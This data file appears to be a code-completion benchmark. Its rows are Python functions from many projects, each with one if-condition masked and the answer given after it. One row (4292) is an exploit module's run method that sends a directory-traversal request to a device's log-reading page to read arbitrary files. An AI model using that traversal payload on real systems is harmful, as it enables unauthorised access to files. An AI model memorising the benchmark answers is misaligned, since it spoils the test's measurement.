4278,"def PARSE_TWO_PARAMS(x, y):<tab>""""""used to convert different possible x/y params to a tuple""""""<tab>if y is not None:<tab><tab>return (x, y)<tab>else:<tab><tab>if isinstance(x, (list, tuple)):<tab><tab><tab>return (x[0], x[1])<tab><tab>else:<tab><tab><tab>if isinstance(x, UNIVERSAL_STRING):<tab><tab><tab><tab>x = x.strip()<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return [int(w.strip()) for w in x.split("","")]<tab><tab><tab>return (x, x)","if "","" in x :",147
4279,"def _load_from_sym_dir(self, root):<tab>root = os.path.abspath(root)<tab>prefix_len = len(root) + 1<tab>for base, _, filenames in os.walk(root):<tab><tab>for filename in filenames:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>path = os.path.join(base, filename)<tab><tab><tab>lib_path = ""/"" + path[prefix_len:-4]<tab><tab><tab>self.add(lib_path, ELF.load_dump(path))","if not filename . endswith ( "".sym"" ) :",134
4280,"def is_vertical(self):<tab>if not self.isFloating():<tab><tab>par = self.parent()<tab><tab><IF-STMT><tab><tab><tab>return par.dockWidgetArea(self) in (<tab><tab><tab><tab>Qt.LeftDockWidgetArea,<tab><tab><tab><tab>Qt.RightDockWidgetArea,<tab><tab><tab>)<tab>return self.size().height() > self.size().width()","if par and hasattr ( par , ""dockWidgetArea"" ) :",106
4281,"def writeBit(self, state, endian):<tab>if self._bit_pos == 7:<tab><tab>self._bit_pos = 0<tab><tab>if state:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._byte |= 1<tab><tab><tab>else:<tab><tab><tab><tab>self._byte |= 128<tab><tab>self._output.write(chr(self._byte))<tab><tab>self._byte = 0<tab>else:<tab><tab>if state:<tab><tab><tab>if endian is BIG_ENDIAN:<tab><tab><tab><tab>self._byte |= 1 << self._bit_pos<tab><tab><tab>else:<tab><tab><tab><tab>self._byte |= 1 << (7 - self._bit_pos)<tab><tab>self._bit_pos += 1",if endian is BIG_ENDIAN :,177
4282,"def init(self):<tab>self.sock.setblocking(True)<tab>if self.parser is None:<tab><tab># wrap the socket if needed<tab><tab><IF-STMT><tab><tab><tab>self.sock = ssl.wrap_socket(<tab><tab><tab><tab>self.sock, server_side=True, **self.cfg.ssl_options<tab><tab><tab>)<tab><tab># initialize the parser<tab><tab>self.parser = http.RequestParser(self.cfg, self.sock, self.client)",if self . cfg . is_ssl :,120
4283,"def construct_scalar(self, node):<tab>if isinstance(node, MappingNode):<tab><tab>for key_node, value_node in node.value:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return self.construct_scalar(value_node)<tab>return super().construct_scalar(node)","if key_node . tag == ""tag:yaml.org,2002:value"" :",85
4284,"def typeNewLine(self, line):<tab>if line >= 0:<tab><tab>iter = self.buffer.get_iter_at_line(line)<tab><tab><IF-STMT><tab><tab><tab>iter.forward_to_line_end()<tab><tab>self.buffer.place_cursor(iter)<tab>elif line < 0:<tab><tab>iter = self.buffer.get_end_iter()<tab><tab>for i in range(line, -1):<tab><tab><tab>iter.backward_line()<tab><tab>iter.forward_to_line_end()<tab><tab>self.buffer.place_cursor(iter)<tab>press(self.view, ""\n"")",if not iter . ends_line ( ) :,156
4285,"def _render_ib_interfaces(cls, network_state, iface_contents, flavor):<tab>ib_filter = renderer.filter_by_type(""infiniband"")<tab>for iface in network_state.iter_interfaces(ib_filter):<tab><tab>iface_name = iface[""name""]<tab><tab>iface_cfg = iface_contents[iface_name]<tab><tab>iface_cfg.kind = ""infiniband""<tab><tab><IF-STMT><tab><tab>route_cfg = iface_cfg.routes<tab><tab>cls._render_subnets(<tab><tab><tab>iface_cfg, iface_subnets, network_state.has_default_route, flavor<tab><tab>)<tab><tab>cls._render_subnet_routes(iface_cfg, route_cfg, iface_subnets, flavor)","iface_subnets = iface . get ( ""subnets"" , [ ] )",193
4286,"def stop(self):<tab>""""""Stops the slapd server, and waits for it to terminate""""""<tab>if self._proc is not None:<tab><tab>self._log.debug(""stopping slapd"")<tab><tab><IF-STMT><tab><tab><tab>self._proc.terminate()<tab><tab>else:<tab><tab><tab>import posix, signal<tab><tab><tab>posix.kill(self._proc.pid, signal.SIGHUP)<tab><tab><tab># time.sleep(1)<tab><tab><tab># posix.kill(self._proc.pid, signal.SIGTERM)<tab><tab><tab># posix.kill(self._proc.pid, signal.SIGKILL)<tab><tab>self.wait()","if hasattr ( self . _proc , ""terminate"" ) :",160
4287,"def _listen(self, consumer_id: str) -> AsyncIterable[Any]:<tab>try:<tab><tab>while True:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>async for msg in self._listen_to_queue(consumer_id):<tab><tab><tab><tab><tab>if msg is not None:<tab><tab><tab><tab><tab><tab>yield msg<tab><tab><tab><tab>await asyncio.sleep(0.5)<tab><tab><tab>else:<tab><tab><tab><tab>async for msg in self._listen_to_ws():<tab><tab><tab><tab><tab>yield msg<tab>except asyncio.CancelledError:<tab><tab>pass<tab>except Exception as e:<tab><tab>raise e",if self . _listening :,153
4288,"def discover_misago_admin():<tab>for app in apps.get_app_configs():<tab><tab>module = import_module(app.name)<tab><tab>if not hasattr(module, ""admin""):<tab><tab><tab>continue<tab><tab>admin_module = import_module(""%s.admin"" % app.name)<tab><tab>if hasattr(admin_module, ""MisagoAdminExtension""):<tab><tab><tab>extension = getattr(admin_module, ""MisagoAdminExtension"")()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>extension.register_navigation_nodes(site)<tab><tab><tab>if hasattr(extension, ""register_urlpatterns""):<tab><tab><tab><tab>extension.register_urlpatterns(urlpatterns)","if hasattr ( extension , ""register_navigation_nodes"" ) :",169
4289,"def update_job(self, job):<tab>if not self.redis.hexists(self.jobs_key, job.id):<tab><tab>raise JobLookupError(job.id)<tab>with self.redis.pipeline() as pipe:<tab><tab>pipe.hset(<tab><tab><tab>self.jobs_key,<tab><tab><tab>job.id,<tab><tab><tab>pickle.dumps(job.__getstate__(), self.pickle_protocol),<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>pipe.zadd(<tab><tab><tab><tab>self.run_times_key,<tab><tab><tab><tab>{job.id: datetime_to_utc_timestamp(job.next_run_time)},<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>pipe.zrem(self.run_times_key, job.id)<tab><tab>pipe.execute()",if job . next_run_time :,200
4290,"def _get_first_available_entry_node(self) -> Optional[str]:<tab>for entry_node in self.entry_nodes:<tab><tab>if entry_node not in self.locked_entry_nodes:<tab><tab><tab>_, wait_until = self._parse_entry_node(entry_node)<tab><tab><tab>now = time.time()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return entry_node<tab>return None",if wait_until <= now :,105
4291,"def answers(self, other):<tab>if not isinstance(other, TCP):<tab><tab>return 0<tab>if conf.checkIPsrc:<tab><tab>if not ((self.sport == other.sport) and (self.dport == other.dport)):<tab><tab><tab>return 0<tab>if conf.check_TCPerror_seqack:<tab><tab>if self.seq is not None:<tab><tab><tab>if self.seq != other.seq:<tab><tab><tab><tab>return 0<tab><tab>if self.ack is not None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return 0<tab>return 1",if self . ack != other . ack :,143
4292,"def run(self):<tab>if self.check():<tab><tab>path = ""/BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../..{}"".format(<tab><tab><tab>self.filename<tab><tab>)<tab><tab>response = self.http_request(method=""GET"", path=path)<tab><tab><IF-STMT><tab><tab><tab>print_success(""Exploit success"")<tab><tab><tab>print_status(""Reading file: {}"".format(self.filename))<tab><tab><tab>print_info(response.text)<tab><tab>else:<tab><tab><tab>print_error(""Exploit failed - could not read file"")<tab>else:<tab><tab>print_error(""Exploit failed - device seems to be not vulnerable"")",if response and response . status_code == 200 and len ( response . text ) :,186
4293,"def write(self, s):<tab>if self.closed:<tab><tab>raise ValueError(""write to closed file"")<tab>if type(s) not in (unicode, str, bytearray):<tab><tab># See issue #19481<tab><tab>if isinstance(s, unicode):<tab><tab><tab>s = unicode.__getitem__(s, slice(None))<tab><tab><IF-STMT><tab><tab><tab>s = str.__str__(s)<tab><tab>elif isinstance(s, bytearray):<tab><tab><tab>s = bytearray.__str__(s)<tab><tab>else:<tab><tab><tab>raise TypeError(""must be string, not "" + type(s).__name__)<tab>return self.shell.write(s, self.tags)","elif isinstance ( s , str ) :",161
4294,"def test_checkblock_valid(self):<tab>for comment, fHeader, fCheckPoW, cur_time, blk in load_test_vectors(<tab><tab>""checkblock_valid.json""<tab>):<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>CheckBlockHeader(blk, fCheckPoW=fCheckPoW, cur_time=cur_time)<tab><tab><tab>else:<tab><tab><tab><tab>CheckBlock(blk, fCheckPoW=fCheckPoW, cur_time=cur_time)<tab><tab>except ValidationError as err:<tab><tab><tab>self.fail('Failed ""%s"" with error %r' % (comment, err))",if fHeader :,160
4295,"def _lookup_fqdn(ip):<tab>try:<tab><tab>return [socket.getfqdn(socket.gethostbyaddr(ip)[0])]<tab>except socket.herror as err:<tab><tab><IF-STMT><tab><tab><tab># No FQDN for this IP address, so we don't need to know this all the time.<tab><tab><tab>log.debug(""Unable to resolve address %s: %s"", ip, err)<tab><tab>else:<tab><tab><tab>log.error(err_message, err)<tab>except (socket.error, socket.gaierror, socket.timeout) as err:<tab><tab>log.error(err_message, err)","if err . errno in ( 0 , HOST_NOT_FOUND , NO_DATA ) :",169
4296,"def send_telnet(self, *args: str):<tab>try:<tab><tab>shell = TelnetShell(self.host)<tab><tab>for command in args:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>shell.check_or_download_busybox()<tab><tab><tab><tab>shell.run_ftp()<tab><tab><tab>else:<tab><tab><tab><tab>shell.exec(command)<tab><tab>shell.close()<tab>except Exception as e:<tab><tab>_LOGGER.exception(f""Telnet command error: {e}"")","if command == ""ftp"" :",127
4297,"def write(path, data, kind=""OTHER"", dohex=0):<tab>asserttype1(data)<tab>kind = string.upper(kind)<tab>try:<tab><tab>os.remove(path)<tab>except os.error:<tab><tab>pass<tab>err = 1<tab>try:<tab><tab><IF-STMT><tab><tab><tab>writelwfn(path, data)<tab><tab>elif kind == ""PFB"":<tab><tab><tab>writepfb(path, data)<tab><tab>else:<tab><tab><tab>writeother(path, data, dohex)<tab><tab>err = 0<tab>finally:<tab><tab>if err and not DEBUG:<tab><tab><tab>try:<tab><tab><tab><tab>os.remove(path)<tab><tab><tab>except os.error:<tab><tab><tab><tab>pass","if kind == ""LWFN"" :",182
4298,"def ApplyInScriptedSection(self, codeBlock, fn, args):<tab>self.BeginScriptedSection()<tab>try:<tab><tab>try:<tab><tab><tab># 				print ""ApplyInSS"", codeBlock, fn, args<tab><tab><tab>return self._ApplyInScriptedSection(fn, args)<tab><tab>finally:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.debugManager.OnLeaveScript()<tab><tab><tab>self.EndScriptedSection()<tab>except:<tab><tab>self.HandleException(codeBlock)",if self . debugManager :,129
4299,"def _escape_attrib(text):<tab># escape attribute value<tab>try:<tab><tab>if ""&"" in text:<tab><tab><tab>text = text.replace(""&"", ""&amp;"")<tab><tab><IF-STMT><tab><tab><tab>text = text.replace(""<"", ""&lt;"")<tab><tab>if "">"" in text:<tab><tab><tab>text = text.replace("">"", ""&gt;"")<tab><tab>if '""' in text:<tab><tab><tab>text = text.replace('""', ""&quot;"")<tab><tab>if ""\n"" in text:<tab><tab><tab>text = text.replace(""\n"", ""&#10;"")<tab><tab>return text<tab>except (TypeError, AttributeError):  # pragma: no cover<tab><tab>_raise_serialization_error(text)","if ""<"" in text :",160
4300,"def compile_relation(self, method, expr, range_list, negated=False):<tab>ranges = []<tab>for item in range_list[1]:<tab><tab><IF-STMT><tab><tab><tab>ranges.append(self.compile(item[0]))<tab><tab>else:<tab><tab><tab>ranges.append(""%s..%s"" % tuple(map(self.compile, item)))<tab>return ""%s%s %s %s"" % (<tab><tab>self.compile(expr),<tab><tab>negated and "" not"" or """",<tab><tab>method,<tab><tab>"","".join(ranges),<tab>)",if item [ 0 ] == item [ 1 ] :,144
4301,"def emptyTree(self):<tab>for child in self:<tab><tab>childObj = child.getObject()<tab><tab>del childObj[NameObject(""/Parent"")]<tab><tab>if NameObject(""/Next"") in childObj:<tab><tab><tab>del childObj[NameObject(""/Next"")]<tab><tab><IF-STMT><tab><tab><tab>del childObj[NameObject(""/Prev"")]<tab>if NameObject(""/Count"") in self:<tab><tab>del self[NameObject(""/Count"")]<tab>if NameObject(""/First"") in self:<tab><tab>del self[NameObject(""/First"")]<tab>if NameObject(""/Last"") in self:<tab><tab>del self[NameObject(""/Last"")]","if NameObject ( ""/Prev"" ) in childObj :",155
4302,"def connect_to_uri(self, uri, autoconnect=None, do_start=True):<tab>try:<tab><tab>conn = self._check_conn(uri)<tab><tab>if not conn:<tab><tab><tab># Unknown connection, add it<tab><tab><tab>conn = self.add_conn(uri)<tab><tab>if autoconnect is not None:<tab><tab><tab>conn.set_autoconnect(bool(autoconnect))<tab><tab>self.show_manager()<tab><tab><IF-STMT><tab><tab><tab>conn.open()<tab><tab>return conn<tab>except Exception:<tab><tab>logging.exception(""Error connecting to %s"", uri)<tab><tab>return None",if do_start :,152
4303,"def get_expression(self):<tab>""""""Return the expression as a printable string.""""""<tab>l = []<tab>for c in self.content:<tab><tab>if c.op is not None:  # only applies to first cell<tab><tab><tab>l.append(c.op)<tab><tab><IF-STMT><tab><tab><tab>l.append(""("" + c.child.get_expression() + "")"")<tab><tab>else:<tab><tab><tab>l.append(""%d"" % c.get_value())<tab>return """".join(l)",if c . child is not None :,124
4304,"def to_word_end(view, s):<tab>if mode == modes.NORMAL:<tab><tab>pt = word_end_reverse(view, s.b, count)<tab><tab>return sublime.Region(pt)<tab>elif mode in (modes.VISUAL, modes.VISUAL_BLOCK):<tab><tab><IF-STMT><tab><tab><tab>pt = word_end_reverse(view, s.b - 1, count)<tab><tab><tab>if pt > s.a:<tab><tab><tab><tab>return sublime.Region(s.a, pt + 1)<tab><tab><tab>return sublime.Region(s.a + 1, pt)<tab><tab>pt = word_end_reverse(view, s.b, count)<tab><tab>return sublime.Region(s.a, pt)<tab>return s",if s . a < s . b :,191
4305,"def whichmodule(obj, name):<tab>""""""Find the module an object belong to.""""""<tab>module_name = getattr(obj, ""__module__"", None)<tab>if module_name is not None:<tab><tab>return module_name<tab># Protect the iteration by using a list copy of sys.modules against dynamic<tab># modules that trigger imports of other modules upon calls to getattr.<tab>for module_name, module in sys.modules.copy().items():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>try:<tab><tab><tab>if _getattribute(module, name)[0] is obj:<tab><tab><tab><tab>return module_name<tab><tab>except AttributeError:<tab><tab><tab>pass<tab>return ""__main__""","if module_name == ""__main__"" or module is None :",171
4306,"def summarize_scalar_dict(name_data, step, name_scope=""Losses/""):<tab>if name_data:<tab><tab>with tf.name_scope(name_scope):<tab><tab><tab>for name, data in name_data.items():<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>tf.compat.v2.summary.scalar(name=name, data=data, step=step)",if data is not None :,98
4307,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab><IF-STMT><tab><tab><tab>self.set_content(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 18:<tab><tab><tab>self.set_blob_key(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 24:<tab><tab><tab>self.set_width(d.getVarInt32())<tab><tab><tab>continue<tab><tab>if tt == 32:<tab><tab><tab>self.set_height(d.getVarInt32())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 10 :,182
4308,"def gather_files(fileset):<tab>common_type = get_common_filetype(fileset)<tab>files = []<tab>for file in fileset.file:<tab><tab>filename = file.name<tab><tab>if file.is_include_file == True:<tab><tab><tab>filename = {}<tab><tab><tab>filename[file.name] = {""is_include_file"": True}<tab><tab><IF-STMT><tab><tab><tab>if type(filename) == str:<tab><tab><tab><tab>filename = {}<tab><tab><tab>filename[file.name] = {""file_type"": file.file_type}<tab><tab>files.append(filename)<tab>return files",if file . file_type != common_type :,158
4309,"def data(self, index: QModelIndex, role=Qt.DisplayRole):<tab>if not index.isValid():<tab><tab>return None<tab>if role == Qt.DisplayRole or role == Qt.EditRole:<tab><tab>i = index.row()<tab><tab>j = index.column()<tab><tab>fieldtype = self.field_types[i]<tab><tab><IF-STMT><tab><tab><tab>return fieldtype.caption<tab><tab>elif j == 1:<tab><tab><tab>return fieldtype.function.name<tab><tab>elif j == 2:<tab><tab><tab>return ProtocolLabel.DISPLAY_FORMATS[fieldtype.display_format_index]",if j == 0 :,142
4310,"def format_coord(x, y):<tab># callback function to format coordinate display in toolbar<tab>x = int(x + 0.5)<tab>y = int(y + 0.5)<tab>try:<tab><tab><IF-STMT><tab><tab><tab>return ""%s @ %s [%4i, %4i]"" % (cur_ax_dat[1][y, x], current, x, y)<tab><tab>else:<tab><tab><tab>return ""%s @ [%4i, %4i]"" % (data[y, x], x, y)<tab>except IndexError:<tab><tab>return """"",if dims :,137
4311,"def getAllUIExtensions(self):<tab>extensions = []<tab>if getExecutionCodeType() == ""MEASURE"":<tab><tab>text = getMeasurementResultString(self)<tab><tab>extensions.append(TextUIExtension(text))<tab>errorType = self.getErrorHandlingType()<tab>if errorType in (""MESSAGE"", ""EXCEPTION""):<tab><tab>data = infoByNode[self.identifier]<tab><tab>message = data.errorMessage<tab><tab><IF-STMT><tab><tab><tab>extensions.append(ErrorUIExtension(message))<tab>extraExtensions = self.getUIExtensions()<tab>if extraExtensions is not None:<tab><tab>extensions.extend(extraExtensions)<tab>return extensions",if message is not None and data . showErrorMessage :,167
4312,"def on_notify(self, notification):<tab>subject = notification[""subject""]<tab>if subject.startswith(""remote_recording.""):<tab><tab>if ""should_start"" in subject and self.online:<tab><tab><tab>session_name = notification[""session_name""]<tab><tab><tab>self.sensor.set_control_value(""capture_session_name"", session_name)<tab><tab><tab>self.sensor.set_control_value(""local_capture"", True)<tab><tab><IF-STMT><tab><tab><tab>self.sensor.set_control_value(""local_capture"", False)","elif ""should_stop"" in subject :",135
4313,"def _log_conn_errors(self):<tab>if ""connection"" in self.event.data:<tab><tab>cinfo = self.event.data[""connection""]<tab><tab><IF-STMT><tab><tab><tab>err_msg = cinfo.get(""error"", [None, None])[1]<tab><tab><tab>if err_msg:<tab><tab><tab><tab>self._log_status(err_msg)","if not cinfo . get ( ""live"" ) :",96
4314,"def setChanged(self, c, changed):<tab># Find the tab corresponding to c.<tab>dw = c.frame.top  # A DynamicWindow<tab>i = self.indexOf(dw)<tab>if i < 0:<tab><tab>return<tab>s = self.tabText(i)<tab>s = g.u(s)<tab>if len(s) > 2:<tab><tab>if changed:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>title = ""* "" + s<tab><tab><tab><tab>self.setTabText(i, title)<tab><tab>else:<tab><tab><tab>if s.startswith(""* ""):<tab><tab><tab><tab>title = s[2:]<tab><tab><tab><tab>self.setTabText(i, title)","if not s . startswith ( ""* "" ) :",172
4315,"def load_file_in_same_dir(ref_file, filename):<tab>""""""Load a given file. Works even when the file is contained inside a zip.""""""<tab>from couchpotato.core.helpers.encoding import toUnicode<tab>path = split_path(toUnicode(ref_file))[:-1] + [filename]<tab>for i, p in enumerate(path):<tab><tab><IF-STMT><tab><tab><tab>zfilename = os.path.join(*path[: i + 1])<tab><tab><tab>zfile = zipfile.ZipFile(zfilename)<tab><tab><tab>return zfile.read(""/"".join(path[i + 1 :]))<tab>return u(io.open(os.path.join(*path), encoding=""utf-8"").read())","if p . endswith ( "".zip"" ) :",172
4316,def __mpcReadyInSlaveMode(self):<tab>while True:<tab><tab>time.sleep(10)<tab><tab>if not win32gui.IsWindow(self.__listener.mpcHandle):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.callbacks.onMpcClosed(None)<tab><tab><tab>break,if self . callbacks . onMpcClosed :,79
4317,"def _invalidate(self, resource_group_name: str, scale_set_name: str) -> None:<tab>with self._lock:<tab><tab><IF-STMT><tab><tab><tab>del self._instance_cache[(resource_group_name, scale_set_name)]<tab><tab>if resource_group_name in self._scale_set_cache:<tab><tab><tab>del self._scale_set_cache[resource_group_name]<tab><tab>if resource_group_name in self._remaining_instances_cache:<tab><tab><tab>del self._remaining_instances_cache[resource_group_name]","if ( resource_group_name , scale_set_name ) in self . _instance_cache :",154
4318,"def close(self):<tab>if self._serial is not None:<tab><tab>try:<tab><tab><tab>self._serial.cancel_read()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._reading_thread.join()<tab><tab>finally:<tab><tab><tab>try:<tab><tab><tab><tab>self._serial.close()<tab><tab><tab><tab>self._serial = None<tab><tab><tab>except Exception:<tab><tab><tab><tab>logging.exception(""Couldn't close serial"")",if self . _reading_thread :,110
4319,"def channel_sizes(self):<tab>""""""List of channel sizes: [(width, height)].""""""<tab>sizes = []<tab>for channel in self.channel_info:<tab><tab><IF-STMT><tab><tab><tab>sizes.append((self.mask_data.width, self.mask_data.height))<tab><tab>elif channel.id == ChannelID.REAL_USER_LAYER_MASK:<tab><tab><tab>sizes.append((self.mask_data.real_width, self.mask_data.real_height))<tab><tab>else:<tab><tab><tab>sizes.append((self.width, self.height))<tab>return sizes",if channel . id == ChannelID . USER_LAYER_MASK :,151
4320,"def get_module_settings():<tab>included_setting = []<tab>module = DataGetter.get_module()<tab>if module is not None:<tab><tab>if module.ticket_include:<tab><tab><tab>included_setting.append(""ticketing"")<tab><tab><IF-STMT><tab><tab><tab>included_setting.append(""payments"")<tab><tab>if module.donation_include:<tab><tab><tab>included_setting.append(""donations"")<tab>return included_setting",if module . payment_include :,109
4321,"def _format_block(<tab>self, prefix: str, lines: List[str], padding: str = None) -> List[str]:<tab>if lines:<tab><tab><IF-STMT><tab><tab><tab>padding = "" "" * len(prefix)<tab><tab>result_lines = []<tab><tab>for i, line in enumerate(lines):<tab><tab><tab>if i == 0:<tab><tab><tab><tab>result_lines.append((prefix + line).rstrip())<tab><tab><tab>elif line:<tab><tab><tab><tab>result_lines.append(padding + line)<tab><tab><tab>else:<tab><tab><tab><tab>result_lines.append("""")<tab><tab>return result_lines<tab>else:<tab><tab>return [prefix]",if padding is None :,161
4322,"def get_task_by_id(events, task_id):<tab>if hasattr(Task, ""_fields""):  # Old version<tab><tab>return events.state.tasks.get(task_id)<tab>else:<tab><tab>_fields = Task._defaults.keys()<tab><tab>task = events.state.tasks.get(task_id)<tab><tab><IF-STMT><tab><tab><tab>task._fields = _fields<tab><tab>return task",if task is not None :,103
4323,"def check(self, value):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>v = value<tab><tab>else:<tab><tab><tab>v = decimal.Decimal(str(value).replace(self.dot, "".""))<tab><tab>return v, None<tab>except (ValueError, TypeError, decimal.InvalidOperation):<tab><tab>return value, translate(self.message)","if isinstance ( value , decimal . Decimal ) :",90
4324,"def check_sales_order_on_hold_or_close(self, ref_fieldname):<tab>for d in self.get(""items""):<tab><tab><IF-STMT><tab><tab><tab>status = frappe.db.get_value(""Sales Order"", d.get(ref_fieldname), ""status"")<tab><tab><tab>if status in (""Closed"", ""On Hold""):<tab><tab><tab><tab>frappe.throw(<tab><tab><tab><tab><tab>_(""Sales Order {0} is {1}"").format(d.get(ref_fieldname), status)<tab><tab><tab><tab>)",if d . get ( ref_fieldname ) :,137
4325,"def nested_match(expect, value):<tab>if expect == value:<tab><tab>return True<tab>if isinstance(expect, dict) and isinstance(value, dict):<tab><tab>for k, v in expect.items():<tab><tab><tab>if k in value:<tab><tab><tab><tab>if not nested_match(v, value[k]):<tab><tab><tab><tab><tab>return False<tab><tab><tab>else:<tab><tab><tab><tab>return False<tab><tab>return True<tab>if isinstance(expect, list) and isinstance(value, list):<tab><tab>for x, y in zip(expect, value):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab><tab>return True<tab>return False","if not nested_match ( x , y ) :",162
4326,"def test_setup_app_sets_loader(self, app):<tab>prev = os.environ.get(""CELERY_LOADER"")<tab>try:<tab><tab>cmd = MockCommand(app=app)<tab><tab>cmd.setup_app_from_commandline([""--loader=X.Y:Z""])<tab><tab>assert os.environ[""CELERY_LOADER""] == ""X.Y:Z""<tab>finally:<tab><tab><IF-STMT><tab><tab><tab>os.environ[""CELERY_LOADER""] = prev<tab><tab>else:<tab><tab><tab>del os.environ[""CELERY_LOADER""]",if prev is not None :,141
4327,"def set_labels_for_constraints(self, constraints):<tab>for label in self._constraints_to_label_args(constraints):<tab><tab><IF-STMT><tab><tab><tab>log.info(<tab><tab><tab><tab>""setting node '%s' label '%s' to '%s'"",<tab><tab><tab><tab>self.name,<tab><tab><tab><tab>label.name,<tab><tab><tab><tab>label.value,<tab><tab><tab>)<tab><tab><tab>self.label_add(label.name, label.value)",if label not in self . labels :,119
4328,"def _match(self, byte_chunk):<tab>quote_character = None<tab>data = byte_chunk.nhtml<tab>open_angle_bracket = data.rfind(""<"")<tab># We are inside <...<tab>if open_angle_bracket <= data.rfind("">""):<tab><tab>return False<tab>for s in data[open_angle_bracket + 1 :]:<tab><tab>if s in ATTR_DELIMITERS:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>quote_character = None<tab><tab><tab><tab>continue<tab><tab><tab>elif not quote_character:<tab><tab><tab><tab>quote_character = s<tab><tab><tab><tab>continue<tab>if quote_character == self.quote_character:<tab><tab>return True<tab>return False",if quote_character and s == quote_character :,173
4329,"def _display_history(config, script, base, head, currents=()):<tab>for sc in script.walk_revisions(base=base or ""base"", head=head or ""heads""):<tab><tab><IF-STMT><tab><tab><tab>sc._db_current_indicator = sc.revision in currents<tab><tab>config.print_stdout(<tab><tab><tab>sc.cmd_format(<tab><tab><tab><tab>verbose=verbose,<tab><tab><tab><tab>include_branches=True,<tab><tab><tab><tab>include_doc=True,<tab><tab><tab><tab>include_parents=True,<tab><tab><tab>)<tab><tab>)",if indicate_current :,139
4330,"def set(self, key=None, value=None):<tab>if key is not None:<tab><tab>k = str(key)<tab><tab>if value is not None:<tab><tab><tab>self.store[k] = value<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>del self.store[k]<tab>else:<tab><tab>self.store.clear()",if self . store . has_key ( k ) :,97
4331,"def _finalize_load(*exc_info):<tab>try:<tab><tab>success_keys = [k for k in data_keys if k not in failed_keys]<tab><tab>if success_keys:<tab><tab><tab>self._holder_ref.put_objects_by_keys(<tab><tab><tab><tab>session_id, success_keys, pin_token=pin_token<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>raise exc_info[1].with_traceback(exc_info[2]) from None<tab><tab>if failed_keys:<tab><tab><tab>raise StorageFull(<tab><tab><tab><tab>request_size=storage_full_sizes[0],<tab><tab><tab><tab>capacity=storage_full_sizes[1],<tab><tab><tab><tab>affected_keys=list(failed_keys),<tab><tab><tab>)<tab>finally:<tab><tab>shared_bufs[:] = []",if exc_info :,200
4332,"def ignore_module(module):<tab>result = False<tab>for check in ignore_these:<tab><tab>if ""/*"" in check:<tab><tab><tab>if check[:-1] in module:<tab><tab><tab><tab>result = True<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>result = True<tab>if result:<tab><tab>print_warning(""Ignoring module: "" + module)<tab>return result","if ( os . getcwd ( ) + ""/"" + check + "".py"" ) == module :",108
4333,"def available(self, exception_flag=True):<tab>""""""True if the solver is available""""""<tab>if exception_flag is False:<tab><tab>return cplex_import_available<tab>else:<tab><tab><IF-STMT><tab><tab><tab>raise ApplicationError(<tab><tab><tab><tab>""No CPLEX <-> Python bindings available - CPLEX direct ""<tab><tab><tab><tab>""solver functionality is not available""<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>return True",if cplex_import_available is False :,115
4334,"def close(self, checkcount=False):<tab>self.mutex.acquire()<tab>try:<tab><tab><IF-STMT><tab><tab><tab>self.openers -= 1<tab><tab><tab>if self.openers == 0:<tab><tab><tab><tab>self.do_close()<tab><tab>else:<tab><tab><tab>if self.openers > 0:<tab><tab><tab><tab>self.do_close()<tab><tab><tab>self.openers = 0<tab>finally:<tab><tab>self.mutex.release()",if checkcount :,116
4335,"def __get__(self, obj, type=None):<tab>if obj is None:<tab><tab>return self<tab>with self.lock:<tab><tab>value = obj.__dict__.get(self.__name__, self._default_value)<tab><tab><IF-STMT><tab><tab><tab>value = self.func(obj)<tab><tab><tab>obj.__dict__[self.__name__] = value<tab><tab>return value",if value is self . _default_value :,96
4336,"def _test_pooling_iteration(input_shape, **kwargs):<tab>""""""One iteration of pool operation with given shapes and attributes""""""<tab>x = -np.arange(np.prod(input_shape), dtype=np.float32).reshape(input_shape) - 1<tab>with tf.Graph().as_default():<tab><tab>in_data = array_ops.placeholder(shape=input_shape, dtype=""float32"")<tab><tab>nn_ops.pool(in_data, **kwargs)<tab><tab><IF-STMT><tab><tab><tab>out_name = ""max_pool:0""<tab><tab>else:<tab><tab><tab>out_name = ""avg_pool:0""<tab><tab>compare_tf_with_tvm(x, ""Placeholder:0"", out_name)","if kwargs [ ""pooling_type"" ] == ""MAX"" :",185
4337,def updateValue(self):<tab>if self._index:<tab><tab>val = toInt(self._model.data(self._index))<tab><tab><IF-STMT><tab><tab><tab>self._updating = True<tab><tab><tab>self.setValue(val)<tab><tab><tab>self._updating = False,if self . sld . value ( ) != val :,74
